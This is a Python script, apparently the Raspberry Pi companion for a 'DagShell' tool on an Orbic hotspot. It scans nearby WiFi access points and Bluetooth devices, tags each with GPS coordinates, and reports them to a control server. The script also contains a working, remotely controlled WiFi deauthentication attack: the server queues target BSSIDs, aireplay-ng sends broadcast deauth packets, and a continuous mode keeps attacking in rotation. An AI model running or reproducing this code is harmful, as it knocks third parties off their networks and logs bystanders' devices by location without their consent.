#!/usr/bin/env python3
"""
DagShell Pi Companion Scanner
Sends GPS, Bluetooth, and WiFi data to Orbic DagShell server

Hardware:
- Raspberry Pi Zero 2 W (or similar)
- U-Blox7 GPS dongle (via gpsd)
- Kinovo BTD400 Bluetooth adapter
- AC600 WiFi adapter (for attacks, optional)
"""

import subprocess
import time
import threading
import argparse
import urllib.request
import urllib.parse
import json
import ssl

# Configuration
ORBIC_URL = "https://192.168.1.1:8443"
GPS_INTERVAL = 2      # Seconds between GPS updates
BT_SCAN_TIME = 5      # Seconds to scan for BT devices
BT_INTERVAL = 10      # Seconds between BT scans
BT_INTERFACE = "hci0"  # Built-in Pi Bluetooth (USB adapters may have power issues)
WIFI_INTERFACE = "wlan1"  # External adapter for attacks

# Global state
current_lat = "0.0"
current_lon = "0.0"
running = True
bt_scanning_active = False  # Controlled by Orbic
deauth_queue = []  # List of (bssid, channel) tuples to deauth
deauth_lock = threading.Lock()  # Thread-safe queue access

# SSL context (ignore self-signed cert)
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# OUI database - prefix-based cache (downloaded on demand)
oui_cache = {}  # Cache of prefix -> {oui: entry} data
OUI_API_BASE = "https://dagnazty.github.io/OUI-Master-Database/api/"
OUI_CACHE_DIR = "/tmp/oui_cache"


def load_oui_database():
    """Initialize OUI cache directory."""
    import os
    try:
        os.makedirs(OUI_CACHE_DIR, exist_ok=True)
        print(f"[OUI] Using prefix-based API at {OUI_API_BASE}")
        print(f"[OUI] Cache directory: {OUI_CACHE_DIR}")
        return True
    except Exception as e:
        print(f"[OUI] Failed to create cache dir: {e}")
        return False


def fetch_oui_prefix(prefix):
    """Fetch and cache OUI data for a given 2-char prefix (e.g., '70' for 70:xx:xx)."""
    import os
    
    prefix = prefix.upper()
    
    # Check memory cache first
    if prefix in oui_cache:
        return oui_cache[prefix]
    
    # Check disk cache
    cache_file = os.path.join(OUI_CACHE_DIR, f"{prefix}.json")
    try:
        if os.path.exists(cache_file):
            cache_age = time.time() - os.path.getmtime(cache_file)
            if cache_age < 2592000:  # 30 days
                with open(cache_file, 'r') as f:
                    data = json.load(f)
                    oui_cache[prefix] = data
                    return data
    except Exception:
        pass
    
    # Download from API
    url = f"{OUI_API_BASE}{prefix}.json"
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'DagShell-Pi-Companion/1.0')
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            oui_cache[prefix] = data
            
            # Save to disk cache
            try:
                with open(cache_file, 'w') as f:
                    json.dump(data, f)
            except Exception:
                pass
            
            return data
    except Exception as e:
        # Return empty dict on error (prefix might not exist)
        oui_cache[prefix] = {}
        return {}


def lookup_oui_manufacturer(mac):
    """Look up manufacturer from OUI database using prefix-based API.
    
    Args:
        mac: MAC address in format XX:XX:XX:XX:XX:XX
        
    Returns:
        Manufacturer name, "Random/Private" for locally administered addresses,
        or "Unknown" if not found
    """
    try:
        # Normalize MAC address (uppercase, colon-separated)
        mac = mac.upper().replace("-", ":")
        parts = mac.split(":")
        if len(parts) < 3:
            return "Unknown"
        
        # Check if this is a locally administered address (random/private)
        # Bit 1 of the first octet being set indicates locally administered
        # These are used by BLE devices for privacy and won't be in any OUI database
        try:
            first_byte = int(parts[0], 16)
            if first_byte & 0x02:  # Bit 1 set = locally administered
                return "Random/Private"
        except ValueError:
            pass
        
        # Get prefix (first 2 hex chars) and OUI key (XX:XX:XX format)
        prefix = parts[0]
        oui_key = f"{parts[0]}:{parts[1]}:{parts[2]}"
        
        # Fetch prefix data (from cache or API)
        prefix_data = fetch_oui_prefix(prefix)
        
        if oui_key in prefix_data:
            entry = prefix_data[oui_key]
            if isinstance(entry, dict):
                # API uses 'm' for manufacturer
                return entry.get("m", "Unknown")
            return str(entry)
        
        return "Unknown"
        
    except Exception as e:
        print(f"[OUI] Lookup error: {e}")
        return "Unknown"



def send_to_orbic(endpoint, data):
    """Send data to Orbic DagShell API"""
    try:
        url = f"{ORBIC_URL}{endpoint}"
        if data:
            req = urllib.request.Request(url, data=data.encode('utf-8'))
        else:
            req = urllib.request.Request(url)
            
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as resp:
            return resp.read().decode()
    except Exception as e:
        # print(f"[!] API error: {e}") # Be quiet about API errors
        return None

def wifi_thread():
    """Scan WiFi networks and send to Orbic"""
    global running, bt_scanning_active, current_lat, current_lon
    print(f"[WiFi] Starting WiFi scan thread (adapter: {WIFI_INTERFACE})...")
    
    while running:
        if not bt_scanning_active:
            time.sleep(2)
            continue
            
        try:
            # Use nmcli for easier parsing
            # Format: BSSID:SSID:SECURITY:CHAN:SIGNAL
            cmd = [
                "nmcli", "-t", "-f", "BSSID,SSID,SECURITY,CHAN,SIGNAL",
                "device", "wifi", "list", "ifname", WIFI_INTERFACE, "--rescan", "yes"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            payload = ""
            count = 0
            for line in result.stdout.splitlines():
                if not line: continue
                # nmcli escapes colons in fields with backslash? No, -t uses : separator.
                # But BSSID has colons. nmcli -t escapes separators with \
                # Actually, BSSID has colons, so nmcli output handles it?
                # Check documentation: nmcli -t escapes the delimiter char if it appears in value.
                # Parsing properly is tricky. 
                # Alternative: iw scan and simple parsing.
                # Let's stick to nmcli but be careful. 
                # Simplest: Just use the fields splitting on unescaped : is hard.
                # Let's use iw scan instead, it's safer for raw access.
                pass
            
            # Reverting to iw scan logic for robustness against field escaping issues
            # Actually, let's use a simpler bash wrapper for iw
            # "iw dev wlan1 scan | egrep 'BSS|SSID:|signal:|DS Parameter set:|WPA:|RSN:'"
            # Too complex script in python string.
            
            # Use iw scan and parsing
            scan_cmd = f"iw dev {WIFI_INTERFACE} scan"
            res = subprocess.run(scan_cmd.split(), capture_output=True, text=True, timeout=10)
            
            aps = []
            current_ap = {}
            
            for line in res.stdout.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if current_ap.get("bssid"):
                        aps.append(current_ap)
                    current_ap = {"bssid": line.split("(")[0].replace("BSS", "").strip(), "ssid": "", "auth": "OPEN", "chan": "0", "rssi": "0"}
                elif line.startswith("SSID: "):
                    current_ap["ssid"] = line.split("SSID: ")[1].strip()
                elif line.startswith("signal: "):
                    current_ap["rssi"] = line.split("signal: ")[1].split(".")[0]
                elif line.startswith("DS Parameter set: channel"):
                     current_ap["chan"] = line.split("channel ")[1]
                elif "WPA:" in line or "RSN:" in line:
                    current_ap["auth"] = "WPA2" if "RSN" in line else "WPA" # Simplification
            
            if current_ap.get("bssid"):
                aps.append(current_ap)
                
            # Build payload
            # Format: BSSID,SSID,Auth,Chan,RSSI,Lat,Lon
            csv_lines = []
            for ap in aps:
                if not ap["ssid"]: continue # Skip hidden? Or keep them.
                line = f"{ap['bssid']},{ap['ssid']},{ap['auth']},{ap['chan']},{ap['rssi']},{current_lat},{current_lon}"
                csv_lines.append(line)
            
            if csv_lines:
                full_payload = "\n".join(csv_lines)
                send_to_orbic("/?cmd=ingest_wifi", full_payload)
                print(f"[WiFi] Sent {len(csv_lines)} APs")
            
        except Exception as e:
            print(f"[WiFi] Scan error: {e}")
            
        time.sleep(10)



def gps_thread():
    """Read GPS from gpsd and send to Orbic"""
    global current_lat, current_lon, running
    print("[GPS] Starting GPS thread...")
    
    import math
    
    def ecef_to_geodetic(x, y, z):
        """Convert ECEF coordinates to geodetic (lat, lon, alt).
        WGS84 ellipsoid parameters."""
        a = 6378137.0  # Semi-major axis
        f = 1/298.257223563  # Flattening
        b = a * (1 - f)  # Semi-minor axis
        e2 = (a**2 - b**2) / a**2  # First eccentricity squared
        ep2 = (a**2 - b**2) / b**2  # Second eccentricity squared
        
        # Longitude
        lon = math.atan2(y, x)
        
        # Iterative latitude calculation (Bowring's method)
        p = math.sqrt(x**2 + y**2)
        lat = math.atan2(z, p * (1 - e2))  # Initial estimate
        
        for _ in range(10):  # Usually converges in 2-3 iterations
            N = a / math.sqrt(1 - e2 * math.sin(lat)**2)
            lat_new = math.atan2(z + e2 * N * math.sin(lat), p)
            if abs(lat_new - lat) < 1e-12:
                break
            lat = lat_new
        
        # Altitude
        N = a / math.sqrt(1 - e2 * math.sin(lat)**2)
        alt = p / math.cos(lat) - N
        
        return math.degrees(lat), math.degrees(lon), alt
    
    try:
        import gps
        gpsd = gps.gps(mode=gps.WATCH_ENABLE | gps.WATCH_NEWSTYLE)
    except ImportError:
        print("[GPS] gps module not installed. Using gpspipe fallback.")
        gpsd = None
    except Exception as e:
        print(f"[GPS] Failed to connect to gpsd: {e}")
        gpsd = None
    
    while running:
        try:
            if gpsd:
                # Use gps module
                report = gpsd.next()
                if report['class'] == 'TPV':
                    lat = getattr(report, 'lat', None)
                    lon = getattr(report, 'lon', None)
                    
                    # Check if lat/lon are 0 but ECEF is available
                    if (lat is None or lat == 0) and hasattr(report, 'ecefx'):
                        ecefx = getattr(report, 'ecefx', None)
                        ecefy = getattr(report, 'ecefy', None)
                        ecefz = getattr(report, 'ecefz', None)
                        if ecefx and ecefy and ecefz:
                            lat, lon, _ = ecef_to_geodetic(ecefx, ecefy, ecefz)
                            print(f"[GPS] Using ECEF conversion")
                    
                    if lat is not None and lon is not None and (lat != 0 or lon != 0):
                        current_lat = f"{lat:.6f}"
                        current_lon = f"{lon:.6f}"
                        print(f"[GPS] {current_lat}, {current_lon}")
                        send_to_orbic(f"/?set_gps={current_lat},{current_lon}", None)
            else:
                # Fallback: use gpspipe
                result = subprocess.run(
                    ["gpspipe", "-w", "-n", "5"],
                    capture_output=True, text=True, timeout=10
                )
                for line in result.stdout.splitlines():
                    if '"class":"TPV"' in line:
                        data = json.loads(line)
                        lat = data.get('lat', 0)
                        lon = data.get('lon', 0)
                        
                        # Check if lat/lon are 0 but ECEF is available
                        if (lat == 0 or lon == 0) and 'ecefx' in data:
                            ecefx = data.get('ecefx')
                            ecefy = data.get('ecefy')
                            ecefz = data.get('ecefz')
                            if ecefx and ecefy and ecefz:
                                lat, lon, _ = ecef_to_geodetic(ecefx, ecefy, ecefz)
                                print(f"[GPS] Using ECEF conversion")
                        
                        if lat != 0 or lon != 0:
                            current_lat = f"{lat:.6f}"
                            current_lon = f"{lon:.6f}"
                            print(f"[GPS] {current_lat}, {current_lon}")
                            send_to_orbic(f"/?set_gps={current_lat},{current_lon}", None)
                            break
        except Exception as e:
            print(f"[GPS] Error: {e}")
        
        time.sleep(GPS_INTERVAL)

def poll_thread():
    """Poll Orbic for commands (start/stop BT, deauth targets)"""
    global running, bt_scanning_active, deauth_queue, continuous_deauth_targets
    print("[POLL] Starting command poll thread...")
    
    while running:
        try:
            resp = send_to_orbic("/?cmd=poll", None)
            if resp:
                data = json.loads(resp)
                # Handle BT scan control
                if "bt_scan" in data:
                    new_state = data["bt_scan"]
                    if new_state != bt_scanning_active:
                        print(f"[POLL] BT Scanning changed to: {new_state}")
                        bt_scanning_active = new_state
                
                # Handle deauth targets from Orbic
                if "deauth_targets" in data and data["deauth_targets"]:
                    targets = data["deauth_targets"]
                    is_continuous = data.get("deauth_continuous", False)
                    
                    for target in targets:
                        # Target format: "BSSID:CHANNEL"
                        if ":" in target and len(target.split(":")) > 6:
                            # Has channel appended after BSSID
                            parts = target.rsplit(":", 1)
                            bssid = parts[0]
                            chan = int(parts[1]) if parts[1].isdigit() else 0
                        else:
                            bssid = target
                            chan = 0
                        
                        if is_continuous:
                            # Add to continuous list
                            with continuous_deauth_lock:
                                if (bssid, chan) not in continuous_deauth_targets:
                                    continuous_deauth_targets.append((bssid, chan))
                                    print(f"[POLL] Added continuous deauth: {bssid} (ch {chan})")
                        else:
                            # One-shot queue
                            with deauth_lock:
                                if (bssid, chan) not in deauth_queue:
                                    deauth_queue.append((bssid, chan))
                                    print(f"[POLL] Queued deauth: {bssid} (ch {chan})")
                
                # Handle stop continuous command
                if data.get("deauth_stop", False):
                    with continuous_deauth_lock:
                        if continuous_deauth_targets:
                            print(f"[POLL] Stopping continuous deauth ({len(continuous_deauth_targets)} targets)")
                            continuous_deauth_targets.clear()
                            
        except Exception as e:
            # print(f"[POLL] Error: {e}") # Be quiet about poll errors
            pass
        
        time.sleep(3)

def bt_thread():
    """Scan for Bluetooth devices and send to Orbic"""
    global running, bt_scanning_active
    print(f"[BT] Starting Bluetooth thread (adapter: {BT_INTERFACE})...")
    
    # Initial setup
    subprocess.run(["rfkill", "unblock", "bluetooth"], capture_output=True)
    subprocess.run(["hciconfig", BT_INTERFACE, "up"], capture_output=True)
    subprocess.run(["hciconfig", BT_INTERFACE, "reset"], capture_output=True)
    time.sleep(1)
    
    while running:
        if not bt_scanning_active:
            time.sleep(1)
            continue
            
        try:
            devices = {}
            print(f"[BT] Scanning for {BT_SCAN_TIME} seconds...")
            
            # Run lescan
            tmp_file = "/tmp/bt_scan.txt"
            cmd = f"timeout {BT_SCAN_TIME} hcitool -i {BT_INTERFACE} lescan --duplicates > {tmp_file} 2>&1"
            subprocess.run(cmd, shell=True)
            
            # Read output
            output = ""
            try:
                with open(tmp_file, "r") as f:
                    output = f.read()
            except:
                pass

            # CHECK FOR ERRORS
            if "Input/output error" in output or "Device is not available" in output:
                print(f"[BT] ADAPTER ERROR DETECTED: {output.strip()}")
                print("[BT] Performing hard reset...")
                subprocess.run(["hciconfig", BT_INTERFACE, "down"], capture_output=True)
                time.sleep(1)
                subprocess.run(["hciconfig", BT_INTERFACE, "reset"], capture_output=True)
                time.sleep(1)
                subprocess.run(["hciconfig", BT_INTERFACE, "up"], capture_output=True)
                print("[BT] Reset complete.")
                time.sleep(2)
                continue # Skip this loop
            
            for line in output.splitlines():
                line = line.strip()
                if not line or line.startswith("LE Scan") or "Set scan parameters" in line:
                    continue
                parts = line.split(maxsplit=1)
                if len(parts) >= 1 and ':' in parts[0] and len(parts[0]) == 17:
                    mac = parts[0].upper()
                    name = parts[1] if len(parts) > 1 and parts[1] != "(unknown)" else "Unknown"
                    if mac not in devices:
                        devices[mac] = name
            
            for mac, name in devices.items():
                # Look up manufacturer from OUI database
                manufacturer = lookup_oui_manufacturer(mac)
                print(f"[BT] Found: {mac} - {name} ({manufacturer})")
                # Format: mac,rssi,name,manufacturer
                encoded = urllib.parse.quote(f"{mac},-50,{name},{manufacturer}")
                send_to_orbic(f"/?set_bt={encoded}", None)
            
            if not devices:
                print("[BT] No devices found or empty scan.")
                
        except Exception as e:
            print(f"[BT] Unexpected Error: {e}")
        
        # Increased sleep to reduce load/crashes
        time.sleep(BT_INTERVAL + 2) 


def get_monitor_interface():
    """Find the actual monitor mode interface name"""
    # Check common names
    for iface in [f"{WIFI_INTERFACE}mon", WIFI_INTERFACE]:
        result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
        if "Monitor" in result.stdout:
            return iface
    # Try to find any monitor interface
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "Monitor" in line or "Mode:Monitor" in line:
            iface = line.split()[0]
            if iface:
                return iface
    return None


def deauth_attack(ap_mac, channel=0, count=10):
    """Send broadcast deauth packets to AP (requires monitor mode)"""
    print(f"[DEAUTH] Targeting AP {ap_mac} (channel {channel})")
    
    mon_iface = None
    try:
        # DON'T use 'airmon-ng check kill' - it kills wpa_supplicant and breaks our hotspot connection!
        # Instead, manually put the attack interface in monitor mode
        
        # Try to bring interface down and set monitor mode manually
        # This preserves other connections (like our SSH via wlan0)
        print(f"[DEAUTH] Setting {WIFI_INTERFACE} to monitor mode...")
        subprocess.run(["ip", "link", "set", WIFI_INTERFACE, "down"], capture_output=True)
        time.sleep(0.2)
        result = subprocess.run(["iw", WIFI_INTERFACE, "set", "type", "monitor"], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[DEAUTH] iw set monitor failed: {result.stderr}")
            # Try airmon-ng as fallback but WITHOUT check kill
            subprocess.run(["airmon-ng", "start", WIFI_INTERFACE], capture_output=True)
            time.sleep(0.5)
        else:
            subprocess.run(["ip", "link", "set", WIFI_INTERFACE, "up"], capture_output=True)
        time.sleep(0.3)
        
        # Find the actual monitor interface
        mon_iface = get_monitor_interface()
        if not mon_iface:
            # Check if interface itself is now in monitor mode
            result = subprocess.run(["iwconfig", WIFI_INTERFACE], capture_output=True, text=True)
            if "Monitor" in result.stdout:
                mon_iface = WIFI_INTERFACE
            else:
                print(f"[DEAUTH] ERROR: Could not enable monitor mode on {WIFI_INTERFACE}")
                return
        
        print(f"[DEAUTH] Using interface: {mon_iface}")
        
        # Set channel if specified
        if channel > 0:
            subprocess.run(["iwconfig", mon_iface, "channel", str(channel)], capture_output=True)
        
        # Send broadcast deauth (no -c = all clients)
        cmd = [
            "aireplay-ng", "--deauth", str(count),
            "-a", ap_mac,
            mon_iface
        ]
        print(f"[DEAUTH] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.stdout:
            print(f"[DEAUTH] {result.stdout}")
        if result.stderr and "No such device" not in result.stderr:
            print(f"[DEAUTH] {result.stderr}")
        print(f"[DEAUTH] Attack complete on {ap_mac}")
        
    except subprocess.TimeoutExpired:
        print(f"[DEAUTH] Timeout on {ap_mac}")
    except Exception as e:
        print(f"[DEAUTH] Error: {e}")
    finally:
        # Stop monitor mode - try both possible names
        if mon_iface:
            subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
        subprocess.run(["airmon-ng", "stop", f"{WIFI_INTERFACE}mon"], capture_output=True)
        # Restore managed mode
        subprocess.run(["iw", WIFI_INTERFACE, "set", "type", "managed"], capture_output=True)
        time.sleep(0.5)


# Continuous deauth targets (these keep getting re-added)
continuous_deauth_targets = []
continuous_deauth_lock = threading.Lock()


def deauth_thread():
    """Background thread that processes deauth queue - supports continuous mode"""
    global running, deauth_queue, continuous_deauth_targets
    print("[DEAUTH] Starting deauth thread...")
    
    while running:
        target = None
        
        # Check one-shot queue first
        with deauth_lock:
            if deauth_queue:
                target = deauth_queue.pop(0)
        
        # If no one-shot, check continuous targets
        if not target:
            with continuous_deauth_lock:
                if continuous_deauth_targets:
                    # Round-robin through continuous targets
                    target = continuous_deauth_targets[0]
                    # Rotate to end
                    continuous_deauth_targets.append(continuous_deauth_targets.pop(0))
        
        if target:
            bssid, channel = target
            deauth_attack(bssid, channel, count=10)  # Fewer packets per round for continuous
            time.sleep(1)  # Short delay for continuous
        else:
            time.sleep(1)


def get_best_bt_interface():
    """Auto-detect the best Bluetooth interface (prefer USB over UART)"""
    try:
        # Get list of adapters
        result = subprocess.run(["hciconfig"], capture_output=True, text=True)
        adapters = []
        current_adapter = None
        
        for line in result.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
                
            if line.startswith("hci"):
                # Format: "hci0: Type: Primary  Bus: UART"
                parts = line.split(":")
                current_adapter = parts[0]
                
                # Check if Bus info is on the same line
                if "Bus:" in line:
                    bus = "USB" if "USB" in line else "UART"
                    adapters.append((current_adapter, bus))
                    current_adapter = None  # Handled
            elif "Bus:" in line and current_adapter:
                # Handle Bus info on subsequent line
                bus = "USB" if "USB" in line else "UART"
                adapters.append((current_adapter, bus))
                current_adapter = None
        
        # Prefer USB adapters (likely the dongle)
        for adapter, bus in adapters:
            if bus == "USB":
                print(f"[*] Auto-detected USB Bluetooth adapter: {adapter}")
                return adapter
                
        # Fallback to whatever is first (usually hci0)
        if adapters:
            print(f"[*] Using default Bluetooth adapter: {adapters[0][0]}")
            return adapters[0][0]
            
    except Exception as e:
        print(f"[!] Error detecting Bluetooth adapters: {e}")
        
    return "hci0"  # Ultimate fallback


def main():
    global running, ORBIC_URL, BT_INTERFACE, WIFI_INTERFACE
    
    # Auto-detect best interface if not manually specified later
    detected_bt = get_best_bt_interface()
    
    parser = argparse.ArgumentParser(description="DagShell Pi Companion Scanner")
    parser.add_argument("--orbic", default=ORBIC_URL, help="Orbic URL")
    parser.add_argument("--bt-iface", default=detected_bt, help=f"Bluetooth adapter (default: auto-detected {detected_bt})")
    parser.add_argument("--wifi-iface", default=WIFI_INTERFACE, help="WiFi interface for attacks")
    parser.add_argument("--no-gps", action="store_true", help="Disable GPS")
    parser.add_argument("--no-bt", action="store_true", help="Disable Bluetooth")
    parser.add_argument("--deauth", metavar="BSSID", help="Run one-shot deauth attack on AP BSSID")
    args = parser.parse_args()
    
    ORBIC_URL = args.orbic
    BT_INTERFACE = args.bt_iface
    WIFI_INTERFACE = args.wifi_iface
    
    print("=" * 50)
    print("DagShell Pi Companion Scanner")
    print(f"Orbic: {ORBIC_URL}")
    print(f"BT Adapter: {BT_INTERFACE}")
    print("=" * 50)
    
    # Load OUI database (one-time download, cached for 24h)
    load_oui_database()
    
    # One-shot deauth mode (CLI)
    if args.deauth:
        deauth_attack(args.deauth, channel=0, count=20)
        return
    
    # Start background threads
    threads = []
    
    # Poll thread (always runs)
    t = threading.Thread(target=poll_thread, daemon=True)
    t.start()
    threads.append(t)
    
    if not args.no_gps:
        t = threading.Thread(target=gps_thread, daemon=True)
        t.start()
        threads.append(t)
    
    if not args.no_bt:
        t = threading.Thread(target=bt_thread, daemon=True)
        t.start()
        threads.append(t)

    # Start WiFi thread
    t = threading.Thread(target=wifi_thread, daemon=True)
    t.start()
    threads.append(t)
    
    # Start Deauth thread (processes queue from poll)
    t = threading.Thread(target=deauth_thread, daemon=True)
    t.start()
    threads.append(t)
    
    # Main loop
    try:
        print("[*] Running... Press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        running = False
        for t in threads:
            t.join(timeout=2)


if __name__ == "__main__":
    main()
